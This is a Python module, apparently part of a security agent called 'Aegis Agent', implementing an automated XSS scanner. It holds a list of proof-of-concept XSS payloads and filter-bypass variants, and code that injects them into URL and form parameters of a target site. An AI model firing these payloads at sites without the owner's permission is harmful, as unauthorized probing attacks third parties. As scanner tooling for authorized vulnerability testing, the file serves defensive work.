# tools/xss_scanner.py
# --- XSS Vulnerability Scanner ---
"""
XSS Scanner for Aegis Agent.

Provides dedicated XSS testing that was missing from the agent.
Tests forms and parameters with comprehensive payload sets.
"""

import asyncio
import logging
import aiohttp
from typing import Dict, List, Any, Optional
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class XSSFinding:
    """Represents a confirmed XSS vulnerability."""
    url: str
    parameter: str
    payload: str
    context: str  # 'html', 'attribute', 'script', 'url'
    severity: str = "HIGH"
    confirmed: bool = False


# Comprehensive XSS payload list organized by context
XSS_PAYLOADS = {
    "html": [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
    ],
    "attribute": [
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover='alert(1)'",
        "\" onfocus=\"alert('XSS')\" autofocus=\"",
        "' onclick='alert(1)'",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
    ],
    "url": [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "javascript:alert(String.fromCharCode(88,83,83))",
    ],
    "filter_bypass": [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<img src=x onerror=alert`1`>",
        "<svg/onload=alert('XSS')>",
        "<<script>alert('XSS');//<</script>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    ],
}


class XSSScanner:
    """
    Dedicated XSS vulnerability scanner.
    
    Tests parameters with various XSS payloads and confirms
    reflected/stored XSS vulnerabilities.
    """
    
    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.findings: List[XSSFinding] = []
        self.tested_count = 0
    
    async def scan_url(
        self,
        url: str,
        params: Dict[str, str],
        method: str = "GET"
    ) -> List[XSSFinding]:
        """
        Scan a URL with parameters for XSS vulnerabilities.
        
        Args:
            url: Target URL
            params: Dictionary of parameter names and sample values
            method: HTTP method (GET or POST)
            
        Returns:
            List of XSSFinding objects
        """
        findings = []
        
        logger.info(f"🔍 XSS scanning {url} with {len(params)} parameters")
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            for param_name, original_value in params.items():
                logger.info(f"  Testing parameter: {param_name}")
                
                for context, payloads in XSS_PAYLOADS.items():
                    for payload in payloads:
                        self.tested_count += 1
                        
                        # Create test params with payload
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        try:
                            # Send request
                            if method.upper() == "GET":
                                async with session.get(url, params=test_params) as response:
                                    body = await response.text()
                            else:
                                async with session.post(url, data=test_params) as response:
                                    body = await response.text()
                            
                            # Check if payload is reflected
                            if self._check_reflection(payload, body):
                                finding = XSSFinding(
                                    url=url,
                                    parameter=param_name,
                                    payload=payload,
                                    context=context,
                                    severity="HIGH",
                                    confirmed=True
                                )
                                findings.append(finding)
                                logger.warning(
                                    f"  ⚠️  XSS FOUND! param={param_name}, "
                                    f"context={context}, payload={payload[:30]}..."
                                )
                                # Don't test more payloads for this context once found
                                break
                                
                        except asyncio.TimeoutError:
                            logger.debug(f"  Timeout testing {param_name} with {payload[:20]}...")
                        except Exception as e:
                            logger.debug(f"  Error testing {param_name}: {e}")
                        
                        # Small delay to avoid overwhelming target
                        await asyncio.sleep(0.1)
        
        self.findings.extend(findings)
        logger.info(f"✅ XSS scan complete. Found {len(findings)} vulnerabilities.")
        return findings
    
    def _check_reflection(self, payload: str, response_body: str) -> bool:
        """
        Check if payload is reflected in response body.
        
        This is a simple check - more sophisticated checks would
        use DOM parsing to confirm executable context.
        """
        # Direct reflection
        if payload in response_body:
            return True
        
        # URL-decoded reflection
        try:
            from urllib.parse import unquote
            decoded_payload = unquote(payload)
            if decoded_payload in response_body:
                return True
        except:
            pass
        
        # Check for key XSS indicators from payload
        # This catches cases where some chars are encoded but XSS still works
        xss_markers = ['<script', 'onerror=', 'onload=', 'onclick=', 'javascript:']
        payload_lower = payload.lower()
        response_lower = response_body.lower()
        
        for marker in xss_markers:
            if marker in payload_lower and marker in response_lower:
                # Potential XSS - would need DOM analysis to confirm
                return True
        
        return False
    
    async def scan_form(
        self,
        url: str,
        form_html: str = None
    ) -> List[XSSFinding]:
        """
        Scan a form for XSS vulnerabilities.
        
        Args:
            url: Form URL
            form_html: Optional form HTML to parse
            
        Returns:
            List of XSSFinding objects
        """
        # Extract form fields from HTML
        params = await self._extract_form_params(url, form_html)
        
        if not params:
            logger.warning(f"No form parameters found at {url}")
            return []
        
        logger.info(f"Found form parameters: {list(params.keys())}")
        
        # Scan with POST method (forms typically use POST)
        findings = await self.scan_url(url, params, method="POST")
        
        # Also test GET in case form accepts both
        findings.extend(await self.scan_url(url, params, method="GET"))
        
        return findings
    
    async def _extract_form_params(
        self,
        url: str,
        form_html: str = None
    ) -> Dict[str, str]:
        """Extract form parameters from HTML."""
        import re
        
        params = {}
        
        # Fetch page if no HTML provided
        if not form_html:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as response:
                        form_html = await response.text()
            except Exception as e:
                logger.error(f"Failed to fetch form: {e}")
                return params
        
        # Extract input fields
        # Pattern matches: <input ... name="xxx" ... value="yyy" ...>
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for name in matches:
            params[name] = "test"  # Default test value
        
        # Extract textarea fields
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        
        for name in matches:
            params[name] = "test"
        
        # Extract select fields
        select_pattern = r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(select_pattern, form_html, re.IGNORECASE)
        
        for name in matches:
            params[name] = "1"  # Select typically needs a value
        
        return params
    
    def get_report(self) -> Dict[str, Any]:
        """Generate a report of all findings."""
        return {
            "total_tests": self.tested_count,
            "vulnerabilities_found": len(self.findings),
            "findings": [
                {
                    "url": f.url,
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "context": f.context,
                    "severity": f.severity,
                    "confirmed": f.confirmed,
                }
                for f in self.findings
            ]
        }


# Singleton instance
_xss_scanner = None


def get_xss_scanner() -> XSSScanner:
    """Factory function to get XSS scanner instance."""
    global _xss_scanner
    if _xss_scanner is None:
        _xss_scanner = XSSScanner()
    return _xss_scanner


async def test_xss(
    url: str,
    params: Dict[str, str] = None,
    scan_form: bool = True
) -> Dict[str, Any]:
    """
    Convenience function for XSS testing.
    
    Args:
        url: Target URL
        params: Optional parameters to test
        scan_form: If True and no params, extract from form HTML
        
    Returns:
        Dictionary with findings
    """
    scanner = get_xss_scanner()
    
    if params:
        findings = await scanner.scan_url(url, params)
    elif scan_form:
        findings = await scanner.scan_form(url)
    else:
        return {"status": "error", "error": "No parameters provided"}
    
    return {
        "status": "success",
        "data": {
            "xss_found": len(findings) > 0,
            "vulnerability_count": len(findings),
            "findings": [
                {
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "severity": f.severity,
                }
                for f in findings
            ]
        }
    }
